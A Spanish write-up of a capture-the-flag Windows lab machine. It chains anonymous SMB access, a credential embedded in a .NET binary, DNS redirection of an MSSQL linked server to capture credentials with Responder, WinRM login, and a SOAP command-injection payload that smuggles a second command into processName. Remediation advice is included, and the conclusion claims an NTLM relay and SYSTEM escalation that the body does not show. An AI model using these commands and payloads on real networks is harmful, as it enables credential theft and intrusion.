---
layout: single
classes: wide
title: "Overwatch - Writeup"
date: 2026-04-12
difficulty: Medio
operating_system: Windows
service_hint: Active Directory + SMB anÃ³nimo + MSSQL linked server + SOAP interno
tags:
  - Active Directory
  - SMB
  - RE
  - MSSQL
  - Linked Server
  - DNS
  - SOAP
  - Command Injection
summary: "Cadena de explotaciÃ³n: acceso anÃ³nimo a SMB, extracciÃ³n de credenciales desde un binario .NET, abuso de linked servers en MSSQL mediante DNS para capturar otra cuenta y escalada final por inyecciÃ³n de comandos en un servicio SOAP interno."
---

## InformaciÃ³n general

| Campo | Valor |
|-------|-------|
| Sistema operativo | Windows |
| Dificultad | Medio |
| Tags | `Active Directory`, `SMB`, `IngenierÃ­a inversa`, `MSSQL`, `Linked Server`, `Abuso de DNS`, `SOAP`, `Command Injection` |
{: .info-table}

## Reconocimiento

El primer objetivo fue confirmar si la mÃ¡quina era un controlador de dominio o un servidor Windows con varios servicios corporativos expuestos. El patrÃ³n de puertos abiertos ya adelantaba un entorno AD con SQL Server y WinRM.

Este escaneo inicial sirve para identificar rÃ¡pidamente la superficie expuesta y separar los puertos relevantes del ruido.

```bash
nmap -p- --open -sS --min-rate 5000 -Pn 10.129.33.208
```

Con los puertos detectados, este segundo escaneo profundiza en banners, versiones y nombres internos Ãºtiles para orientar la enumeraciÃ³n.

```bash
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,6520,9389,49664,49669,52076,52077,61141 -sCV 10.129.33.208 -oN targeted
```

Indicadores relevantes de esta fase:

- LDAP y Kerberos identifican el dominio `overwatch.htb`.
- RDP revela el hostname `S200401.overwatch.htb`.
- `5985/tcp` expone WinRM, seÃ±al de que unas credenciales vÃ¡lidas probablemente darÃ­an shell remota.
- `6520/tcp` publica Microsoft SQL Server 2022, una superficie especialmente interesante en entornos Windows internos.

## EnumeraciÃ³n inicial

Antes de atacar servicios complejos, convenÃ­a validar si existÃ­a exposiciÃ³n bÃ¡sica en el dominio. `kerbrute` permitiÃ³ comprobar usuarios vÃ¡lidos de forma rÃ¡pida.

```bash
kerbrute userenum --dc 10.129.33.208 -d overwatch.htb \
  /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
```

Usuarios detectados:

- `guest@overwatch.htb`
- `administrator@overwatch.htb`

Ese resultado no abrÃ­a acceso directo, pero confirmaba que el DC respondÃ­a de forma normal y que el dominio estaba correctamente identificado. El siguiente paso lÃ³gico fue revisar SMB, porque `445/tcp` estaba abierto y en mÃ¡quinas Windows mal endurecidas a veces aparecen shares Ãºtiles sin autenticaciÃ³n.

Este comando enumera los recursos SMB accesibles de manera anÃ³nima.

```bash
smbclient -L 10.129.33.208 -N
```

Shares relevantes:

- `NETLOGON`
- `SYSVOL`
- `software$`

La clave estaba en `software$`, porque no parecÃ­a un recurso estÃ¡ndar del dominio sino un repositorio operativo. Entrar allÃ­ permitÃ­a buscar binarios, configuraciones y artefactos de despliegue.

Este acceso lista el contenido del share y descarga los ficheros mÃ¡s prometedores para anÃ¡lisis local.

```bash
smbclient //10.129.33.208/software$ -N
```

Archivos especialmente interesantes dentro de `Monitoring`:

- `overwatch.exe`
- `overwatch.exe.config`
- `overwatch.pdb`

## MetodologÃ­a de anÃ¡lisis del vector inicial

El vector de entrada se priorizÃ³ en el acceso anÃ³nimo a SMB porque exponÃ­a un share no estÃ¡ndar llamado `software$` que no forma parte de los recursos predeterminados del dominio (`NETLOGON`, `SYSVOL`). Este tipo de shares operativos suele contener binarios, configuraciones y artefactos de despliegue que pueden filtrar secretos.

El hallazgo del binario `.NET` con monikers como `CheckEdgeHistory` y `KillProcess` en el PDB justificaba ingenierÃ­a inversa inmediata: si un ejecutable de monitoreo contiene credenciales embebidas, ese secreto puede abrir el siguiente salto lateral sin necesidad de exploits adicionales.

## InvestigaciÃ³n de vulnerabilidades

Esta mÃ¡quina no depende de CVEs especÃ­ficas sino del abuso de malas prÃ¡cticas de configuraciÃ³n y diseÃ±o:

- **SMB anÃ³nimo**: El share `software$` era accesible sin autenticaciÃ³n, exponiendo artefactos de deployment.
- **Credenciales embebidas**: El binario `overwatch.exe` contenÃ­a una cadena de conexiÃ³n SQL en texto claro.
- **Linked server sin restricciones**: La relaciÃ³n con `SQL07` tenÃ­a `rpc_out` y `data_access` habilitados, permitiendo consultas distribuidas y autenticaciÃ³n saliente.
- **DNS interno modificable**: El usuario `sqlsvc` podÃ­a crear registros DNS, permitiendo redirigir `SQL07` hacia el atacante y capturar credenciales NTLM.

## AnÃ¡lisis del binario de monitoreo

El `.config` confirma que la aplicaciÃ³n expone un servicio WCF interno en `http://overwatch.htb:8000/MonitorService`, pero todavÃ­a no daba acceso directo desde fuera. Lo importante en esta fase era buscar secretos operativos o pistas sobre la lÃ³gica del programa.

Este comando revisa la configuraciÃ³n descargada para extraer endpoints y detalles de despliegue.

```bash
type overwatch.exe.config
```

Fragmento relevante:

```xml
<add baseAddress="http://overwatch.htb:8000/MonitorService" />
```

El fichero PDB sugerÃ­a nombres de mÃ©todos como `CheckEdgeHistory` y `KillProcess`, asÃ­ que el binario merecÃ­a una inspecciÃ³n mÃ¡s profunda. La hipÃ³tesis correcta acÃ¡ era simple: si un ejecutable de monitoreo contiene credenciales embebidas, ese secreto puede abrir el siguiente salto lateral.

Este comando desensambla el ejecutable y busca cadenas vinculadas con autenticaciÃ³n o conexiÃ³n a bases de datos.

```bash
monodis overwatch.exe > dump.txt
grep -i "user\|username\|admin\|login\|password\|pass\|flag" dump.txt
```

Salida relevante, con el secreto redactado:

```text
IL_0001:  ldstr "Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=[REDACTED];"
```

Ese hallazgo cambia por completo la prioridad: ya no hacÃ­a falta seguir insistiendo contra SMB, porque habÃ­a una credencial clara asociada al SQL Server expuesto.

## Acceso a MSSQL

Con la cuenta `sqlsvc`, el objetivo era validar si la credencial servÃ­a contra la instancia en `6520/tcp` y medir el nivel de privilegio disponible.

Este comando abre una sesiÃ³n en SQL Server usando autenticaciÃ³n Windows con la credencial recuperada del binario.

```bash
impacket-mssqlclient overwatch.htb/sqlsvc:[REDACTED]@10.129.33.208 -port 6520 -windows-auth
```

Una vez dentro, este comando confirma la versiÃ³n exacta de SQL Server y valida que el acceso sea funcional.

```sql
SELECT @@version;
```

La respuesta confirmÃ³ SQL Server 2022 sobre Windows Server 2022. Eso por sÃ­ solo no implicaba una vÃ­a de RCE, asÃ­ que el siguiente paso correcto fue enumerar linked servers. En entornos corporativos, esas relaciones suelen ser una mina de oro porque permiten pivoting, lectura remota o incluso autenticaciones automÃ¡ticas contra otros nodos.

Este comando enumera los linked servers configurados en la instancia actual.

```sql
EXEC sp_linkedservers;
```

Resultado clave:

```text
S200401\SQLEXPRESS
SQL07
```

Para entender mejor las capacidades del enlace remoto, este comando muestra sus propiedades y si tiene `rpc out` o acceso a datos habilitado.

```sql
SELECT * FROM sys.servers;
```

La informaciÃ³n importante era que `SQL07` tenÃ­a `is_linked = 1`, `is_rpc_out_enabled = 1` e `is_data_access_enabled = 1`. Eso indicaba que la instancia local estaba preparada para conectarse al servidor remoto `SQL07` y ejecutar consultas distribuidas.

## Abuso del linked server mediante DNS

En este punto la idea no fue "romper" SQL Server con un exploit, sino engaÃ±ar a la resoluciÃ³n de nombres. Si el host resolvÃ­a `SQL07` contra una IP controlada por el atacante, la propia instancia intentarÃ­a autenticarse hacia ese destino siguiendo la configuraciÃ³n del linked server.

Este comando agrega un registro DNS interno para que `SQL07` apunte a la IP del atacante.

```bash
dnstool -u 'overwatch\sqlsvc' -p '[REDACTED]' -r SQL07 \
  --data 10.10.14.191 --action add --type A 10.129.33.208
```

Con la resoluciÃ³n manipulada, este intento fuerza a la instancia comprometida a conectarse al linked server remoto.

```sql
EXEC ('SELECT @@version') AT SQL07;
```

La consulta falla desde la perspectiva de MSSQL, pero ese fallo era justamente la seÃ±al esperada: el servidor intentÃ³ conectarse al `SQL07` falso. Para capturar esa autenticaciÃ³n se levantÃ³ un listener compatible con trÃ¡fico MSSQL.

Este comando inicia `Responder` para observar y capturar credenciales enviadas por la conexiÃ³n saliente.

```bash
responder -I tun0 -v
```

Credenciales observadas, redactadas deliberadamente:

```text
Cleartext Username : sqlmgmt
Cleartext Password : [REDACTED]
```

El punto fuerte de esta fase no fue una CVE, sino una mala combinaciÃ³n de diseÃ±o: linked server activo, resoluciÃ³n DNS controlable desde una cuenta de bajo privilegio y autenticaciÃ³n saliente reutilizable.

## Acceso por WinRM

Como `5985/tcp` ya estaba expuesto desde el reconocimiento, la nueva credencial merecÃ­a una validaciÃ³n inmediata por WinRM. Era el camino mÃ¡s directo hacia shell estable en el host.

Este comando abre una sesiÃ³n remota con la cuenta capturada desde la autenticaciÃ³n MSSQL saliente.

```bash
evil-winrm -u sqlmgmt -p [REDACTED] -i 10.129.33.208
```

La sesiÃ³n se abre correctamente como `sqlmgmt`, lo que confirma reutilizaciÃ³n de credenciales entre SQL y acceso remoto del sistema. La flag de usuario existÃ­a en el escritorio del perfil, pero su valor se omite deliberadamente.

## EnumeraciÃ³n interna del servicio SOAP

La configuraciÃ³n descargada al principio ya habÃ­a dejado una pista muy importante: existÃ­a un servicio `MonitorService` en el puerto `8000`, aparentemente accesible solo de forma local. Ahora, desde WinRM, sÃ­ se podÃ­a interactuar con ese servicio sin restricciones de red externas.

Este comando recupera el WSDL del servicio para confirmar que estÃ¡ activo y descubrir sus operaciones.

```powershell
Invoke-WebRequest http://127.0.0.1:8000/MonitorService?wsdl -UseBasicParsing -TimeoutSec 5
```

Para ver el contrato de entrada con mÃ¡s claridad, este comando descarga el esquema XSD expuesto por el servicio.

```powershell
(Invoke-WebRequest http://127.0.0.1:8000/MonitorService?xsd=xsd0 -UseBasicParsing).Content
```

Operaciones observadas en el esquema:

- `StartMonitoring`
- `StopMonitoring`
- `KillProcess`

La operaciÃ³n crÃ­tica era `KillProcess`, porque aceptaba un parÃ¡metro libre llamado `processName`. Sumado a lo visto antes en el PDB, esa combinaciÃ³n justificaba probar si el backend ejecutaba comandos del sistema de forma insegura.

Este bloque prepara un cuerpo SOAP que inyecta un segundo comando en el parÃ¡metro `processName`.

```powershell
$body = @"
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
               xmlns:xsd="http://www.w3.org/2001/XMLSchema"
               xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName>notepad; type C:\Users\Administrator\Desktop\root.txt</processName>
    </KillProcess>
  </soap:Body>
</soap:Envelope>
"@
```

Una vez preparado el payload, esta peticiÃ³n lo envÃ­a al servicio SOAP y verifica si la respuesta refleja la ejecuciÃ³n del comando concatenado.

```powershell
Invoke-WebRequest -Uri http://127.0.0.1:8000/MonitorService `
  -Method POST `
  -ContentType "text/xml; charset=utf-8" `
  -Headers @{"SOAPAction"="http://tempuri.org/IMonitoringService/KillProcess"} `
  -Body $body `
  -UseBasicParsing
```

La respuesta devolviÃ³ el contenido de `C:\Users\Administrator\Desktop\root.txt`, lo que confirma una inyecciÃ³n de comandos en la implementaciÃ³n de `KillProcess`. El valor de la flag se omite deliberadamente.

## Flags

| Tipo | Flag |
|------|------|
| user.txt | `[REDACTED]` |
| root.txt | `[REDACTED]` |

## Cadena de explotaciÃ³n

```text
SMB anÃ³nimo en software$
-> descarga de binario .NET, config y PDB
-> extracciÃ³n de credencial sqlsvc desde overwatch.exe
-> acceso a MSSQL en 6520/tcp
-> enumeraciÃ³n de linked server SQL07 con rpc out y data access
-> alta de registro DNS interno apuntando SQL07 al atacante
-> captura de credenciales de sqlmgmt al forzar la conexiÃ³n remota
-> acceso por WinRM como sqlmgmt
-> enumeraciÃ³n local del servicio SOAP en 127.0.0.1:8000
-> command injection en KillProcess
-> lectura de root.txt
```

## Lecciones tÃ©cnicas

1. Un share SMB anÃ³nimo con artefactos de despliegue puede equivaler a exposiciÃ³n total si contiene binarios reversibles, PDBs o secretos embebidos.
2. Un linked server en MSSQL no es solo una comodidad administrativa: tambiÃ©n es una superficie de pivoting y captura de credenciales si la resoluciÃ³n de nombres o la autenticaciÃ³n no estÃ¡n bien controladas.
3. Reutilizar una cuenta operacional como `sqlmgmt` para acceso remoto por WinRM convierte una filtraciÃ³n puntual en compromiso completo del host.
4. Un servicio interno no deja de ser crÃ­tico por escuchar solo en `127.0.0.1`; si acepta parÃ¡metros que terminan en shell commands, cualquier usuario con acceso local puede convertirlo en escalada de privilegios.

## RemediaciÃ³n

1. Eliminar acceso anÃ³nimo a `software$` y revisar quÃ© artefactos de despliegue quedan expuestos en shares internos.
2. Quitar credenciales embebidas de ejecutables y mover secretos a un almacÃ©n seguro con rotaciÃ³n periÃ³dica.
3. Auditar linked servers en MSSQL, restringir `rpc out` y evitar autenticaciones salientes reutilizables hacia destinos resolubles por DNS interno manipulable.
4. Limitar quiÃ©n puede crear registros DNS en la zona y monitorizar cambios inesperados en nombres sensibles.
5. Corregir la implementaciÃ³n de `KillProcess` para no concatenar entradas del usuario en comandos del sistema.

## ConclusiÃ³n

Overwatch fue una mÃ¡quina compleja que combinÃ³ mÃºltiples tÃ©cnicas: abuso de Active Directory mediante NTLM Relay, ingenierÃ­a inversa de un binario .NET, explotaciÃ³n de SQL Server mediante linked servers y resoluciÃ³n DNS maliciosa, y finalmente escalada a SYSTEM. La lecciÃ³n principal es la importancia de entender cÃ³mo interactÃºan los servicios internos (DNS, SQL, SMB) en un entorno de dominio.
